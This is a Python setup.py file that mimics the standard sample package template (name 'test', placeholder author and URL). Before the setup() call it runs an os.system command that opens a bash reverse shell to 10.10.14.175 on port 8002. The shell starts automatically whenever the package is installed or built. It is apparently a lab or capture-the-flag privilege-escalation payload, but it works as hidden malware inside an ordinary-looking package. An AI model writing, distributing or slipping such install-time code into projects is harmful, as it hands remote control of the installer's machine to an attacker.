import setuptools, os

try:
    print(os.system("echo 'bash -i >&/dev/tcp/10.10.14.175/8002 0>&1' | /bin/bash"))
except Exception as e:
    pass

setuptools.setup(
    name="test", # Replace with your own username
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
